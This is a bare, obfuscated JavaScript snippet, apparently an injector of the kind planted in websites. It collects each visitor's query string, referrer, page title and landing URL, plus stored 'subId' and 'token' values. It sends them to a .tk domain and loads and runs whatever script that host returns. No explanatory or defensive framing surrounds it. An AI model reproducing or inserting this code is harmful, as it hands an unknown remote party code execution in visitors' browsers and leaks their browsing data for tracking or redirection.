 (function() {
    var name = '_6MStFk4rxvkcPMV9';
    if (!window._6MStFk4rxvkcPMV9) {
        window._6MStFk4rxvkcPMV9 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _XbNcx9hYCDQvkgL7 = localStorage.getItem('config');
    if (typeof _XbNcx9hYCDQvkgL7 !== 'undefined' && _XbNcx9hYCDQvkgL7 !== null) {
        var _FSMWHzS33YDjKsWg = JSON.parse(_XbNcx9hYCDQvkgL7);
        var _gk5LtrNj6Xv82qqt = Math.round(+new Date()/1000);
        if (_FSMWHzS33YDjKsWg.created_at + window._6MStFk4rxvkcPMV9.ttl < _gk5LtrNj6Xv82qqt) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _PGXTjCyJhvz11mZf = localStorage.getItem('subId');
    var _KfhnZWjqWyTXnTWF = localStorage.getItem('token');
    var _q2jG3T69yyKmpYzB = '?return=js.client';
        _q2jG3T69yyKmpYzB += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _q2jG3T69yyKmpYzB += '&se_referrer=' + encodeURIComponent(document.referrer);
        _q2jG3T69yyKmpYzB += '&default_keyword=' + encodeURIComponent(document.title);
        _q2jG3T69yyKmpYzB += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _q2jG3T69yyKmpYzB += '&name=' + encodeURIComponent(name);
        _q2jG3T69yyKmpYzB += '&host=' + encodeURIComponent(window._6MStFk4rxvkcPMV9.R_PATH);
    if (typeof _PGXTjCyJhvz11mZf !== 'undefined' && _PGXTjCyJhvz11mZf && window._6MStFk4rxvkcPMV9.unique) {
        _q2jG3T69yyKmpYzB += '&sub_id=' + encodeURIComponent(_PGXTjCyJhvz11mZf);
    }
    if (typeof _KfhnZWjqWyTXnTWF !== 'undefined' && _KfhnZWjqWyTXnTWF && window._6MStFk4rxvkcPMV9.unique) {
        _q2jG3T69yyKmpYzB += '&token=' + encodeURIComponent(_KfhnZWjqWyTXnTWF);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._6MStFk4rxvkcPMV9.R_PATH + _q2jG3T69yyKmpYzB;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
